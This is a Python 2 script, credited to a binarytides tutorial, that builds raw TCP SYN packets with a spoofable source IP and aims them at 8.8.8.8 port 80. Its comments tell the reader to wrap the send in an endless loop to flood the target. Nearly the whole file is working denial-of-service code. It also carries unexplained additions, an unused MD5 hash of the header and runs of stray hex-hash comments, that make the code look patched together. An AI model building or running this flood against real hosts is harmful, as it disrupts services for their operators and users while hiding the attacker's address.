'''
    Syn flood program in python using raw sockets (Linux)
    http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
    Silver Moon (m00n.silv3r@gmail.com)
'''
 

import hashlib




# some imports
import socket, sys
from struct import *
 
# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    #s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s
 
#create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
 
# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     
# now start constructing the packet
packet = '';
 
source_ip = '192.168.1.94'
dest_ip = '8.8.8.8' # or socket.gethostbyname('www.google.com')
 
# ip header fields
ihl = 5
version = 4
tos = 0
tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
id = 54321  #Id of this packet
frag_off = 0
ttl = 255
protocol = socket.IPPROTO_TCP
check = 10  # python seems to correctly fill the checksum
saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
daddr = socket.inet_aton ( dest_ip )
 
ihl_version = (version << 4) + ihl
 
# the ! in the pack format string means network order
#ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)



#   B B H H H B B H
ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)





# tcp header fields
source = 1234   # source port
dest = 80   # destination port
seq = 0
ack_seq = 0
doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
#tcp flags
fin = 0
syn = 1
rst = 0
psh = 0
ack = 0
urg = 0
window = socket.htons(5840)    # 5840  maximum allowed window size
check = 0
urg_ptr = 0
 
offset_res = (doff << 4) + 0
tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
 



# the ! in the pack format string means network order
tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr) #da7eb06fe649d8d25efc3e9fa8cf592d





#b365e44125171bfb8fdd38149132c8fa
#560983d09a745bbd930c380e945d4be9
#6d1cbc7adc476c50a3121c1fcab2f48f
#6ac449f2f5ddde74d5f1049b8faa1750
#5a171105d753f87ea6366d7f22835ae5
#34c8d05062f4cd8c6a536d67ede15f56
#8eb1fddbf573f54d230e0c63ca6c7452
#49eb5f490a42cb49472e68a4204483c0
#da7eb06fe649d8d25efc3e9fa8cf592d





 
# pseudo header fields
source_address = socket.inet_aton( source_ip )
dest_address = socket.inet_aton(dest_ip)
placeholder = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_header)
 





psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);




psh = psh + tcp_header; # 2d9597b9b53c8d08e2da9efaee81664c




tcp_checksum = checksum(psh)
 
# make the tcp header again and fill the correct checksum
tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

# final full packet - syn packets dont have any data
packet = ip_header + tcp_header
 




hash_object = hashlib.md5(tcp_header)
md5_hash = hash_object.hexdigest() 
print(len(packet))
print("\n\n")


#Send the packet finally - the port specified has no effect
s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
 
#put the above line in a loop like while 1: if you want to flood


